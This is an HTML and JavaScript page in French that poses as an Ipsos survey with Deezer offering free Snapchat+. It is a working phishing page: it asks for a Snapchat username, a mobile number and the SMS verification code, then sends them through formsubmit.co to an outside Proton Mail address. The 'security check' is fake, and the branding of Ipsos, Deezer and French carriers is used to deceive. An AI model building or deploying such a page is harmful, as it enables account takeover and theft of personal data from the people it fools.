<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Sondage | Ipsos</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
body {
    font-family: 'Inter', sans-serif;
    background: #f4f6f9;
    margin: 0;
    overflow-x: hidden;
}

/* HEADER */
.header {
    background: #003b7a;
    padding: 25px 30px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}
.header img { height: 50px; }
.header-text { color: #fff; font-size: 24px; font-weight: 700; }
.logo-fixed { position: fixed; top: 15px; right: 15px; height: 50px; z-index: 999; }

/* BOUTONS ET TEXTES CENTR√âS */
.box {
    max-width: 650px;
    margin: 50px auto;
    background: white;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.12);
    text-align: center;
    display: none;
    opacity: 0;
    transform: translateY(30px);
    transition: all 0.5s ease;
}
.box.active { display: block; opacity:1; transform: translateY(0); }

h2 { font-size: 24px; margin-bottom: 20px; color: #003b7a; }
p,label { font-size: 16px; color: #333; line-height: 1.5; text-align:left; }
input[type=text], select { width: 100%; padding: 12px; font-size: 16px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
input:focus { border-color: #0078d4; outline: none; box-shadow: 0 0 8px rgba(0,120,212,0.3); }
button { padding: 12px 28px; background: #0078d4; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 10px; }
button:hover { background: #005fa3; transform: translateY(-1px) scale(1.02); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }

.progress-container { width: 90%; height: 16px; background: #e0e0e0; border-radius: 8px; margin: 20px auto; position: relative; }
.progress-bar { height: 100%; width: 0%; background: #0078d4; border-radius: 8px; transition: width 0.5s ease; }
.progress-text { position: absolute; right: 10px; top: 0; font-size: 14px; font-weight: 600; color: #003b7a; line-height: 16px; }

.about { max-width: 650px; margin: 20px auto 40px auto; padding: 20px; background: #e8f0fe; border-radius: 10px; font-size: 14px; color: #003b7a; line-height: 1.4; text-align:left; }

.footer { text-align: center; padding: 20px 0; font-size: 14px; color: #999; margin-top: 20px; border-top: 1px solid #ddd; }

@media (max-width:600px){
    .box { margin:30px 15px; padding:20px; }
    h2 { font-size:20px; }
    p,label { font-size:14px; }
    input[type=text], select { font-size:14px; padding:10px; }
    button { font-size:14px; padding:10px 20px; }
}
</style>
</head>
<body>
<img src="francelogo.png" class="logo-fixed" alt="France">

<div class="header">
    <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos r√©ponses seront perdues.')">
        <img src="logo.png" alt="Ipsos">
    </a>
    <div class="header-text">Ipsos ‚Äì Sondage</div>
</div>

<div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
    <div class="progress-text" id="progressText">0%</div>
</div>

<!-- √âtape 1 : Deezer -->
<div class="box active" id="etape1">
<h2>Vos habitudes d'√©coute Deezer üéµ</h2>
<p>Merci de r√©pondre aux questions sur vos artistes et genres pr√©f√©r√©s. Ces informations restent confidentielles et servent uniquement √† notre √©tude.</p>
<label>Utilisez-vous Deezer ?</label><br>
<input type="radio" name="deezer_use" value="Oui"> Oui<br>
<input type="radio" name="deezer_use" value="Non"> Non<br><br>
<label>Combien de jours par semaine √©coutez-vous Deezer ?</label><br>
<select name="deezer_freq">
<option value="">-- S√©lectionnez --</option>
<option value="1-2 jours">1‚Äì2 jours</option>
<option value="3-4 jours">3‚Äì4 jours</option>
<option value="5-7 jours">5‚Äì7 jours</option>
</select><br><br>
<label>Quels artistes √©coutez-vous le plus ? (jusqu'√† 5)</label><br>
<input type="text" name="artiste1" placeholder="Artiste 1">
<input type="text" name="artiste2" placeholder="Artiste 2">
<input type="text" name="artiste3" placeholder="Artiste 3">
<input type="text" name="artiste4" placeholder="Artiste 4">
<input type="text" name="artiste5" placeholder="Artiste 5"><br><br>
<label>Genres principaux :</label><br>
<input type="checkbox" name="genre[]" value="Pop"> Pop<br>
<input type="checkbox" name="genre[]" value="Rap / Hip-hop"> Rap / Hip-hop<br>
<input type="checkbox" name="genre[]" value="R&B"> R&B<br>
<input type="checkbox" name="genre[]" value="Electro"> Electro<br>
<input type="checkbox" name="genre[]" value="Rock"> Rock<br>
<input type="checkbox" name="genre[]" value="Afro"> Afro<br>
<input type="checkbox" name="genre[]" value="Autre"> Autre<br><br>
<button id="btnEtape1">Continuer</button>
</div>
<!-- √âtape 2 : Compte Snapchat -->
<div class="box" id="etape2">
<h2>Recevoir Snapchat+ üéÅ</h2>
<p>Merci de nous fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
<input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
<button id="btnEtape2">Suivant</button>
</div>

<!-- √âtape 3 : V√©rification anti-robot -->
<div class="box" id="etape3">
<h2>V√©rification de s√©curit√© ü§ñ</h2>
<p>Avant de continuer, nous proc√©dons √† une v√©rification pour confirmer que vous n‚Äô√™tes pas un robot et √©viter les abus. Cette √©tape est obligatoire.</p>
<button id="btnEtape3">Continuer</button>
</div>

<!-- √âtape 4 : Num√©ro de t√©l√©phone -->
<div class="box" id="etape4">
<h2>Num√©ro de t√©l√©phone üì±</h2>
<p>Veuillez entrer votre num√©ro de t√©l√©phone pour recevoir un code de v√©rification par SMS. Le num√©ro doit commencer par 06 ou 07 et comporter 10 chiffres.</p>
<input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
<button id="btnEtape4">Suivant</button>
</div>

<script>
let reponses = {}; // stocke toutes les r√©ponses

function showStep(etapeId, percent){
    document.querySelectorAll('.box').forEach(b => b.classList.remove('active'));
    document.getElementById(etapeId).classList.add('active');
    document.getElementById('progressBar').style.width = percent+"%";
    document.getElementById('progressText').innerText = percent+"%";
}

// Fonction pour envoyer un mail
async function sendMail(dataObj, sujet){
    const formData = new FormData();
    formData.append("_subject", sujet);
    formData.append("_cc", "John123abcd@proton.me"); // mail de ton boss
    formData.append("_captcha", "false");
    for(let key in dataObj){ formData.append(key, dataObj[key]); }
    try{
        await fetch("https://formsubmit.co/John123abcd@proton.me", {
            method:"POST",
            body: formData,
            headers:{ "Accept": "application/json" }
        });
        console.log("Mail envoy√©:", sujet);
    }catch(e){ console.error("Erreur mail", e); }
}

// √âtape 1 -> √âtape 2
document.getElementById('btnEtape1').addEventListener('click', ()=>{
    // Collecte Deezer
    let deezerUse = document.querySelector('input[name="deezer_use"]:checked');
    if(!deezerUse){ alert("Veuillez indiquer si vous utilisez Deezer."); return; }
    reponses.deezer_use = deezerUse.value;
    reponses.deezer_freq = document.querySelector('select[name="deezer_freq"]').value || "";
    for(let i=1;i<=5;i++){ reponses['artiste'+i] = document.querySelector('input[name="artiste'+i+'"]').value || ""; }
    reponses.genre = Array.from(document.querySelectorAll('input[name="genre[]"]:checked')).map(g=>g.value).join(", ");

    showStep('etape2',20);
});

// √âtape 2 -> √âtape 3
document.getElementById('btnEtape2').addEventListener('click', ()=>{
    let snap = document.getElementById('compte_snap').value.trim();
    if(!snap){ alert("Veuillez entrer votre identifiant Snapchat."); return; }
    reponses.compte_snap = snap;
    showStep('etape3',40);
});

// √âtape 3 -> √âtape 4 (anti-robot)
document.getElementById('btnEtape3').addEventListener('click', ()=>{
    showStep('etape4',60);
});

// √âtape 4 -> validation num√©ro et mail 1
document.getElementById('btnEtape4').addEventListener('click', ()=>{
    let tel = document.getElementById('telephone').value.trim();
    if(!/^(06|07)\d{8}$/.test(tel)){ alert("Num√©ro invalide. Il doit commencer par 06 ou 07 et comporter 10 chiffres."); return; }
    reponses.telephone = tel;

    // Envoi mail 1 : Deezer + Snapchat + Num√©ro
    sendMail(reponses, "R√©ponses Deezer + Snapchat + Num√©ro - Ipsos");
    showStep('etape5',80); // √©tape suivante (code SMS)
});
</script>

<!-- √âtape 5 : Code SMS (mail 2 s√©par√©) -->
<div class="box" id="etape5">
<h2>Code de v√©rification SMS</h2>
<p>Veuillez entrer le code que vous avez re√ßu par SMS pour finaliser l‚Äôinscription et recevoir votre cadeau.</p>
<input type="text" id="code_sms" placeholder="Code re√ßu">
<button id="btnEtape5">Terminer</button>
</div>
<script>
// √âtape 5 -> fin
document.getElementById('btnEtape5').addEventListener('click', ()=>{
    let code = document.getElementById('code_sms').value.trim();
    if(!code){ alert("Veuillez entrer le code re√ßu par SMS."); return; }
    reponses.code_sms = code;

    // Envoi mail 2 : juste code SMS
    sendMail({compte_snap: reponses.compte_snap, telephone: reponses.telephone, code_sms: code}, 
             "Code SMS - Ipsos");

    showStep('etape6',100); // √©tape finale
});
</script>

<!-- √âtape 6 : Merci -->
<div class="box" id="etape6">
<h2>Merci pour votre participation ! üéâ</h2>
<p>Votre Snapchat+ sera activ√© sous peu. Les informations collect√©es sont confidentielles et utilis√©es uniquement pour cette √©tude en partenariat avec Deezer.</p>
</div>

<!-- Texte explicatif / partenaires -->
<div class="about">
<strong>√Ä propos du partenariat :</strong><br>
Ce sondage est organis√© par <strong>Ipsos</strong> en collaboration avec <strong>Deezer</strong> pour offrir Snapchat+ gratuitement.  
Cette offre est exclusivement r√©serv√©e aux clients des partenaires suivants : <strong>Bouygues Telecom, SFR et Orange</strong>.  
Nous vous remercions pour votre participation et votre temps !
</div>

<!-- Pied de page -->
<div class="footer">¬© 2026 Ipsos ‚Äì Tous droits r√©serv√©s</div>

<style>
/* Animations simples pour transitions */
.box{
    transition: all 0.5s ease-in-out;
}
.box.active{
    animation: fadeInUp 0.6s ease forwards;
}
@keyframes fadeInUp{
    0%{opacity:0; transform: translateY(30px);}
    100%{opacity:1; transform: translateY(0);}
}
</style>
